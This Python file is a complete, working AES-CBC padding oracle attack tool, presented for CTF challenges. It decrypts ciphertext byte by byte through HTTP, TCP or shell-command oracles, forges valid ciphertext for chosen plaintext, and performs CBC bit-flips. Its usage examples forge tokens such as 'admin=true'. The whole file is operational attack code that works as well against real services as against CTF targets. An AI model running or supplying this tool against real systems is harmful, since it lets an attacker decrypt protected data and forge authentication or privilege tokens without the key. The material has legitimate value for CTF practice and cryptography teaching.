#!/usr/bin/env python3
"""auto_padding_oracle -- AES CBC padding oracle attack tool for CTF challenges.

Implements the full Vaudenay padding oracle attack for byte-by-byte decryption
of AES-CBC ciphertext, plus CBC bit-flip attacks given known plaintext.

Supports both URL-based oracles (HTTP status/body differentiation) and raw
TCP socket oracles.

Usage:
    python3 auto_padding_oracle.py --url "http://target/decrypt?ct={ct}" \\
        --ciphertext 0xABCD... --flag-format "flag{"
    python3 auto_padding_oracle.py --target HOST:PORT \\
        --ciphertext AABBCC... --oracle-check "Valid"
    python3 auto_padding_oracle.py --url "http://target/decrypt?ct={ct}" \\
        --ciphertext AABBCC... --encrypt "admin=true"

Outputs EXTRACTED FLAG: <flag> on success.
"""
import argparse
import base64
import os
import re
import sys
import time
import urllib.parse
import urllib.request
import urllib.error
import socket
import struct

# ---------------------------------------------------------------------------
# Flag scanning
# ---------------------------------------------------------------------------
DEFAULT_FLAG_RE = re.compile(r"[a-zA-Z_]{2,}\{[^}]{3,}\}")


def _scan_flags(text: str, flag_format: str = "") -> list[str]:
    """Return all flag-like strings found in *text*."""
    flags: list[str] = []
    if flag_format:
        prefix = flag_format.rstrip("{")
        try:
            pat = re.compile(re.escape(prefix) + r"\{[^}]{3,}\}")
            flags.extend(m.group(0) for m in pat.finditer(text))
        except re.error:
            pass
    flags.extend(m.group(0) for m in DEFAULT_FLAG_RE.finditer(text))
    seen: set[str] = set()
    unique: list[str] = []
    for f in flags:
        if f not in seen:
            seen.add(f)
            unique.append(f)
    return unique


# ---------------------------------------------------------------------------
# Ciphertext parsing -- accepts hex (with/without 0x) or base64
# ---------------------------------------------------------------------------

def parse_ciphertext(ct_str: str) -> bytes:
    """Parse ciphertext from hex or base64 string."""
    ct_str = ct_str.strip()
    # Try hex first
    hex_str = ct_str
    if hex_str.startswith("0x") or hex_str.startswith("0X"):
        hex_str = hex_str[2:]
    try:
        return bytes.fromhex(hex_str)
    except ValueError:
        pass
    # Try base64
    try:
        return base64.b64decode(ct_str)
    except Exception:
        pass
    # Try URL-safe base64
    try:
        return base64.urlsafe_b64decode(ct_str + "==")
    except Exception:
        pass
    print(f"[-] Cannot parse ciphertext: {ct_str[:60]}...")
    sys.exit(1)


def encode_for_oracle(data: bytes, encoding: str) -> str:
    """Encode bytes for transmission to oracle."""
    if encoding == "hex":
        return data.hex()
    elif encoding == "base64":
        return base64.b64encode(data).decode()
    elif encoding == "urlsafe_base64":
        return base64.urlsafe_b64encode(data).decode().rstrip("=")
    else:
        return data.hex()


# ---------------------------------------------------------------------------
# Oracle interfaces
# ---------------------------------------------------------------------------

class HttpOracle:
    """Oracle that sends ciphertext via HTTP and checks response."""

    def __init__(
        self,
        url_template: str,
        valid_check: str = "",
        invalid_check: str = "",
        encoding: str = "hex",
        timeout: float = 10.0,
    ):
        self.url_template = url_template
        self.valid_check = valid_check
        self.invalid_check = invalid_check
        self.encoding = encoding
        self.timeout = timeout
        self._request_count = 0

    def check_padding(self, ciphertext: bytes) -> bool:
        """Return True if the oracle indicates valid padding."""
        ct_encoded = encode_for_oracle(ciphertext, self.encoding)
        url = self.url_template.replace("{ct}", ct_encoded)
        self._request_count += 1

        try:
            req = urllib.request.Request(url)
            resp = urllib.request.urlopen(req, timeout=self.timeout)
            body = resp.read().decode("utf-8", errors="replace")
            status = resp.status

            # If user gave a validity string, use it
            if self.valid_check:
                return self.valid_check in body
            if self.invalid_check:
                return self.invalid_check not in body

            # Default: 200 = valid padding, anything else = invalid
            return status == 200

        except urllib.error.HTTPError as e:
            body = ""
            try:
                body = e.read().decode("utf-8", errors="replace")
            except Exception:
                pass
            if self.invalid_check and self.invalid_check in body:
                return False
            if self.valid_check and self.valid_check in body:
                return True
            # Common pattern: 403/500 = bad padding, 200 = good
            return False
        except Exception:
            return False

    @property
    def request_count(self) -> int:
        return self._request_count


class SocketOracle:
    """Oracle that sends ciphertext via raw TCP."""

    def __init__(
        self,
        host: str,
        port: int,
        valid_check: str = "",
        invalid_check: str = "",
        encoding: str = "hex",
        timeout: float = 5.0,
    ):
        self.host = host
        self.port = port
        self.valid_check = valid_check
        self.invalid_check = invalid_check
        self.encoding = encoding
        self.timeout = timeout
        self._request_count = 0

    def check_padding(self, ciphertext: bytes) -> bool:
        """Send ciphertext over TCP and check response."""
        ct_encoded = encode_for_oracle(ciphertext, self.encoding)
        self._request_count += 1

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.host, self.port))

            # Read banner
            banner = b""
            try:
                banner = sock.recv(4096)
            except socket.timeout:
                pass

            # Send ciphertext
            sock.sendall((ct_encoded + "\n").encode())
            time.sleep(0.2)

            # Read response
            response = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                pass

            sock.close()
            body = response.decode("utf-8", errors="replace")

            if self.valid_check:
                return self.valid_check in body
            if self.invalid_check:
                return self.invalid_check not in body

            # Heuristic: longer response or "ok"/"success" = valid
            lower = body.lower()
            if "invalid" in lower or "error" in lower or "bad" in lower:
                return False
            return True

        except Exception:
            return False

    @property
    def request_count(self) -> int:
        return self._request_count


class CommandOracle:
    """Oracle that runs a shell command with {ct} substituted."""

    def __init__(
        self,
        command_template: str,
        valid_check: str = "",
        invalid_check: str = "",
        encoding: str = "hex",
    ):
        self.command_template = command_template
        self.valid_check = valid_check
        self.invalid_check = invalid_check
        self.encoding = encoding
        self._request_count = 0

    def check_padding(self, ciphertext: bytes) -> bool:
        """Run the command and check output / exit code."""
        import subprocess

        ct_encoded = encode_for_oracle(ciphertext, self.encoding)
        cmd = self.command_template.replace("{ct}", ct_encoded)
        self._request_count += 1

        try:
            proc = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=10,
            )
            output = proc.stdout + proc.stderr

            if self.valid_check:
                return self.valid_check in output
            if self.invalid_check:
                return self.invalid_check not in output

            return proc.returncode == 0

        except Exception:
            return False

    @property
    def request_count(self) -> int:
        return self._request_count


# ---------------------------------------------------------------------------
# Padding Oracle Attack -- Vaudenay's attack (decrypt)
# ---------------------------------------------------------------------------

def padding_oracle_decrypt(
    oracle,
    ciphertext: bytes,
    block_size: int = 16,
    iv: bytes | None = None,
    verbose: bool = False,
) -> bytes:
    """Decrypt AES-CBC ciphertext using a padding oracle.

    The ciphertext should include the IV as the first block, or *iv* should be
    provided separately.  Returns the full decrypted plaintext (with PKCS#7
    padding stripped).
    """
    if iv is not None:
        blocks = [iv] + [
            ciphertext[i : i + block_size]
            for i in range(0, len(ciphertext), block_size)
        ]
    else:
        # Assume IV is the first block of ciphertext
        blocks = [
            ciphertext[i : i + block_size]
            for i in range(0, len(ciphertext), block_size)
        ]

    if len(ciphertext) % block_size != 0:
        print(f"[-] Ciphertext length ({len(ciphertext)}) is not a multiple of block size ({block_size})")
        sys.exit(1)

    num_blocks = len(blocks)
    print(f"[*] {num_blocks} blocks (including IV), block size = {block_size}")
    print(f"[*] Will decrypt {num_blocks - 1} plaintext block(s)")

    plaintext = b""

    for block_idx in range(1, num_blocks):
        print(f"\n[+] Decrypting block {block_idx}/{num_blocks - 1}...")
        prev_block = bytearray(blocks[block_idx - 1])
        curr_block = bytes(blocks[block_idx])

        # intermediate[i] = D_k(curr_block)[i]  -- the raw decrypted bytes
        intermediate = bytearray(block_size)
        decrypted_block = bytearray(block_size)

        for byte_pos in range(block_size - 1, -1, -1):
            pad_value = block_size - byte_pos  # PKCS#7 padding byte

            # Build the attack block: for already-known bytes, set them to
            # produce the desired padding value
            attack = bytearray(block_size)
            for k in range(byte_pos + 1, block_size):
                attack[k] = intermediate[k] ^ pad_value

            found = False
            for guess in range(256):
                attack[byte_pos] = guess

                # Construct: attack_block || curr_block
                test_ct = bytes(attack) + curr_block

                if oracle.check_padding(test_ct):
                    # Verify it's not a false positive for byte_pos == block_size - 1
                    if byte_pos == block_size - 1 and pad_value == 1:
                        # Flip a prior byte to confirm it's truly 0x01 padding
                        verify = bytearray(attack)
                        verify[byte_pos - 1] ^= 0x01
                        verify_ct = bytes(verify) + curr_block
                        if not oracle.check_padding(verify_ct):
                            continue  # False positive

                    intermediate[byte_pos] = guess ^ pad_value
                    decrypted_block[byte_pos] = intermediate[byte_pos] ^ prev_block[byte_pos]
                    found = True

                    if verbose:
                        partial = bytes(decrypted_block)
                        printable = "".join(
                            chr(b) if 32 <= b <= 126 else "."
                            for b in partial
                        )
                        print(
                            f"    byte[{byte_pos:2d}] = 0x{decrypted_block[byte_pos]:02x} "
                            f"('{chr(decrypted_block[byte_pos]) if 32 <= decrypted_block[byte_pos] <= 126 else '.'}') "
                            f"  partial: {printable}",
                        )
                    break

            if not found:
                print(f"    [-] Failed to recover byte at position {byte_pos}")
                decrypted_block[byte_pos] = ord("?")

        block_text = bytes(decrypted_block)
        printable = block_text.decode("utf-8", errors="replace")
        print(f"    Block {block_idx} plaintext: {printable!r}")
        plaintext += block_text

    # Strip PKCS#7 padding
    plaintext = _strip_pkcs7(plaintext, block_size)
    return plaintext


def _strip_pkcs7(data: bytes, block_size: int) -> bytes:
    """Strip PKCS#7 padding, with validation."""
    if not data:
        return data
    pad_byte = data[-1]
    if 1 <= pad_byte <= block_size:
        if data[-pad_byte:] == bytes([pad_byte]) * pad_byte:
            return data[:-pad_byte]
    # Invalid padding -- return as-is
    return data


# ---------------------------------------------------------------------------
# Reverse Oracle -- encrypt arbitrary plaintext
# ---------------------------------------------------------------------------

def padding_oracle_encrypt(
    oracle,
    plaintext: bytes,
    block_size: int = 16,
    verbose: bool = False,
) -> bytes:
    """Encrypt arbitrary plaintext using a padding oracle (reverse attack).

    Produces valid ciphertext that decrypts to the given plaintext under
    the target's key, without knowing the key.

    Returns IV + ciphertext.
    """
    # PKCS#7 pad the plaintext
    pad_len = block_size - (len(plaintext) % block_size)
    padded = plaintext + bytes([pad_len]) * pad_len
    pt_blocks = [
        padded[i : i + block_size]
        for i in range(0, len(padded), block_size)
    ]

    num_blocks = len(pt_blocks)
    print(f"[*] Encrypting {num_blocks} block(s) of plaintext")

    # Start with a random last ciphertext block
    ct_blocks: list[bytes] = [os.urandom(block_size)]

    for block_idx in range(num_blocks - 1, -1, -1):
        target_pt = pt_blocks[block_idx]
        next_ct = ct_blocks[0]
        print(f"\n[+] Computing ciphertext for block {block_idx + 1}/{num_blocks}...")

        # We need to find intermediate = D_k(next_ct)
        intermediate = bytearray(block_size)

        for byte_pos in range(block_size - 1, -1, -1):
            pad_value = block_size - byte_pos

            attack = bytearray(block_size)
            for k in range(byte_pos + 1, block_size):
                attack[k] = intermediate[k] ^ pad_value

            for guess in range(256):
                attack[byte_pos] = guess
                test_ct = bytes(attack) + next_ct

                if oracle.check_padding(test_ct):
                    if byte_pos == block_size - 1 and pad_value == 1:
                        verify = bytearray(attack)
                        if byte_pos > 0:
                            verify[byte_pos - 1] ^= 0x01
                        verify_ct = bytes(verify) + next_ct
                        if not oracle.check_padding(verify_ct):
                            continue

                    intermediate[byte_pos] = guess ^ pad_value
                    if verbose:
                        print(f"    byte[{byte_pos:2d}] intermediate = 0x{intermediate[byte_pos]:02x}")
                    break

        # Now compute prev ciphertext block: prev[i] = intermediate[i] ^ target_pt[i]
        prev_ct = bytes(intermediate[i] ^ target_pt[i] for i in range(block_size))
        ct_blocks.insert(0, prev_ct)

    # ct_blocks[0] is the IV, rest is ciphertext
    result = b"".join(ct_blocks)
    print(f"\n[+] Encrypted ciphertext ({len(result)} bytes): {result.hex()}")
    return result


# ---------------------------------------------------------------------------
# CBC Bit-Flip Attack
# ---------------------------------------------------------------------------

def cbc_bitflip(
    ciphertext: bytes,
    known_plaintext: bytes,
    target_plaintext: bytes,
    block_size: int = 16,
    target_block: int = 1,
) -> bytes:
    """Perform a CBC bit-flip attack.

    Given known plaintext at a specific block position, flip bits in the
    previous ciphertext block to change the decrypted plaintext to the
    target value.

    *target_block* is 0-indexed (block 0 = first plaintext block after IV).
    To modify block N, we flip bits in ciphertext block N-1 (or the IV for
    block 0).
    """
    ct = bytearray(ciphertext)

    if len(known_plaintext) != block_size or len(target_plaintext) != block_size:
        print(f"[-] known_plaintext and target_plaintext must both be {block_size} bytes")
        # Pad or truncate
        known_plaintext = known_plaintext.ljust(block_size, b"\x00")[:block_size]
        target_plaintext = target_plaintext.ljust(block_size, b"\x00")[:block_size]

    # The previous block starts at offset target_block * block_size
    # (since block 0 of ciphertext is the IV)
    prev_offset = target_block * block_size

    if prev_offset + block_size > len(ct):
        print("[-] Target block out of range")
        return bytes(ct)

    for i in range(block_size):
        ct[prev_offset + i] ^= known_plaintext[i] ^ target_plaintext[i]

    print(f"[+] Bit-flip applied to block {target_block}")
    print(f"[+] Modified ciphertext: {bytes(ct).hex()}")
    return bytes(ct)


# ---------------------------------------------------------------------------
# Auto-detect encoding
# ---------------------------------------------------------------------------

def detect_encoding(ct_str: str) -> str:
    """Guess whether the oracle expects hex, base64, or urlsafe_base64."""
    ct_str = ct_str.strip()
    if ct_str.startswith("0x"):
        return "hex"
    # If it's valid hex (even-length, all hex chars)
    if len(ct_str) % 2 == 0 and all(c in "0123456789abcdefABCDEF" for c in ct_str):
        return "hex"
    # If it contains base64 padding or url-safe chars
    if "-" in ct_str or "_" in ct_str:
        return "urlsafe_base64"
    if "+" in ct_str or "/" in ct_str or ct_str.endswith("="):
        return "base64"
    # Default to hex
    return "hex"


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="AES CBC padding oracle attack tool for CTF challenges.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            '  # Decrypt via HTTP oracle (hex-encoded CT in URL):\n'
            '  python3 auto_padding_oracle.py \\\n'
            '    --url "http://target/decrypt?ct={ct}" \\\n'
            '    --ciphertext 0xABCDEF... --flag-format "flag{"\n'
            "\n"
            "  # Decrypt via TCP oracle:\n"
            "  python3 auto_padding_oracle.py \\\n"
            "    --target 10.0.0.1:9999 \\\n"
            '    --ciphertext AABBCC... --oracle-check "OK"\n'
            "\n"
            "  # Encrypt arbitrary plaintext (reverse oracle):\n"
            "  python3 auto_padding_oracle.py \\\n"
            '    --url "http://target/decrypt?ct={ct}" \\\n'
            '    --ciphertext AABBCC... --encrypt "admin=true"\n'
            "\n"
            "  # CBC bit-flip attack:\n"
            "  python3 auto_padding_oracle.py \\\n"
            '    --ciphertext AABBCC... --bitflip \\\n'
            '    --known "comment1=cooking" --target-plaintext ";admin=true;x="\n'
        ),
    )

    # Oracle endpoint
    oracle_group = parser.add_mutually_exclusive_group()
    oracle_group.add_argument(
        "--url",
        metavar="URL",
        help="HTTP oracle URL with {ct} placeholder for ciphertext",
    )
    oracle_group.add_argument(
        "--target",
        metavar="HOST:PORT",
        help="TCP oracle endpoint",
    )
    oracle_group.add_argument(
        "--oracle-cmd",
        metavar="CMD",
        help="Shell command oracle with {ct} placeholder",
    )

    # Ciphertext
    parser.add_argument(
        "--ciphertext",
        required=True,
        help="Ciphertext to decrypt (hex or base64)",
    )
    parser.add_argument(
        "--iv",
        default="",
        help="IV if separate from ciphertext (hex or base64)",
    )
    parser.add_argument(
        "--block-size",
        type=int,
        default=16,
        help="AES block size in bytes (default: 16)",
    )
    parser.add_argument(
        "--encoding",
        choices=["hex", "base64", "urlsafe_base64", "auto"],
        default="auto",
        help="Encoding for ciphertext sent to oracle (default: auto-detect)",
    )

    # Oracle response checking
    parser.add_argument(
        "--oracle-check",
        default="",
        help="String in response that indicates VALID padding",
    )
    parser.add_argument(
        "--oracle-invalid",
        default="",
        help="String in response that indicates INVALID padding",
    )

    # Mode selection
    parser.add_argument(
        "--encrypt",
        metavar="PLAINTEXT",
        help="Encrypt arbitrary plaintext (reverse oracle attack)",
    )
    parser.add_argument(
        "--bitflip",
        action="store_true",
        help="Perform CBC bit-flip attack instead of padding oracle",
    )
    parser.add_argument(
        "--known",
        metavar="PLAINTEXT",
        help="Known plaintext at target block (for bit-flip)",
    )
    parser.add_argument(
        "--target-plaintext",
        metavar="PLAINTEXT",
        help="Desired plaintext at target block (for bit-flip)",
    )
    parser.add_argument(
        "--target-block",
        type=int,
        default=1,
        help="Target block index for bit-flip (0-indexed, default: 1)",
    )

    # Output
    parser.add_argument(
        "--flag-format",
        default="",
        help="Expected flag prefix, e.g. 'flag{' or 'CTF{'",
    )
    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Print per-byte progress",
    )

    args = parser.parse_args()

    # Parse ciphertext
    ciphertext = parse_ciphertext(args.ciphertext)
    iv = parse_ciphertext(args.iv) if args.iv else None
    block_size = args.block_size

    print(f"[*] Ciphertext: {len(ciphertext)} bytes ({len(ciphertext) // block_size} blocks)")
    if iv:
        print(f"[*] IV: {iv.hex()}")

    # Determine encoding
    encoding = args.encoding
    if encoding == "auto":
        encoding = detect_encoding(args.ciphertext)
    print(f"[*] Oracle encoding: {encoding}")

    # -------------------------------------------------------------------
    # Mode: CBC bit-flip (no oracle needed)
    # -------------------------------------------------------------------
    if args.bitflip:
        if not args.known or not args.target_plaintext:
            print("[-] --bitflip requires --known and --target-plaintext")
            sys.exit(1)

        known = args.known.encode()
        target = args.target_plaintext.encode()

        modified = cbc_bitflip(
            ciphertext, known, target, block_size, args.target_block,
        )

        print(f"\n[+] Modified ciphertext (hex): {modified.hex()}")
        print(f"[+] Modified ciphertext (b64): {base64.b64encode(modified).decode()}")

        flags = _scan_flags(modified.hex() + " " + base64.b64encode(modified).decode(), args.flag_format)
        if flags:
            for f in flags:
                print(f"EXTRACTED FLAG: {f}")
        return

    # -------------------------------------------------------------------
    # Build oracle
    # -------------------------------------------------------------------
    if not args.url and not args.target and not args.oracle_cmd:
        print("[-] One of --url, --target, or --oracle-cmd is required for oracle attacks")
        print("[-] (Only --bitflip can work without an oracle)")
        sys.exit(1)

    if args.url:
        if "{ct}" not in args.url:
            print("[-] --url must contain {ct} placeholder")
            sys.exit(1)
        oracle = HttpOracle(
            args.url,
            valid_check=args.oracle_check,
            invalid_check=args.oracle_invalid,
            encoding=encoding,
        )
        print(f"[*] Oracle: HTTP ({args.url[:60]}...)")
    elif args.target:
        try:
            host, port_str = args.target.rsplit(":", 1)
            port = int(port_str)
        except ValueError:
            print("[-] Invalid --target format. Use HOST:PORT")
            sys.exit(1)
        oracle = SocketOracle(
            host, port,
            valid_check=args.oracle_check,
            invalid_check=args.oracle_invalid,
            encoding=encoding,
        )
        print(f"[*] Oracle: TCP ({host}:{port})")
    else:
        oracle = CommandOracle(
            args.oracle_cmd,
            valid_check=args.oracle_check,
            invalid_check=args.oracle_invalid,
            encoding=encoding,
        )
        print(f"[*] Oracle: Command ({args.oracle_cmd[:60]})")

    # -------------------------------------------------------------------
    # Mode: Encrypt arbitrary plaintext
    # -------------------------------------------------------------------
    if args.encrypt:
        pt = args.encrypt.encode()
        print(f"\n[+] Encrypting: {pt!r}")
        result = padding_oracle_encrypt(oracle, pt, block_size, args.verbose)
        print(f"\n[+] Result (hex): {result.hex()}")
        print(f"[+] Result (b64): {base64.b64encode(result).decode()}")
        print(f"[*] Total oracle queries: {oracle.request_count}")
        return

    # -------------------------------------------------------------------
    # Mode: Decrypt (default)
    # -------------------------------------------------------------------
    print(f"\n[+] Starting Vaudenay padding oracle attack...")
    start = time.time()

    plaintext = padding_oracle_decrypt(
        oracle, ciphertext, block_size, iv, args.verbose,
    )

    elapsed = time.time() - start
    print(f"\n[+] Decryption complete in {elapsed:.1f}s")
    print(f"[*] Total oracle queries: {oracle.request_count}")

    # Display result
    try:
        text = plaintext.decode("utf-8")
        print(f"[+] Plaintext (UTF-8): {text!r}")
    except UnicodeDecodeError:
        text = plaintext.decode("latin-1")
        print(f"[+] Plaintext (latin-1): {text!r}")
    print(f"[+] Plaintext (hex): {plaintext.hex()}")

    # Scan for flags
    flags = _scan_flags(text, args.flag_format)
    if flags:
        for f in flags:
            print(f"\nEXTRACTED FLAG: {f}")
    else:
        print("\n[-] No flag pattern found in plaintext.")
        print(f"[*] Raw plaintext: {text}")


if __name__ == "__main__":
    main()
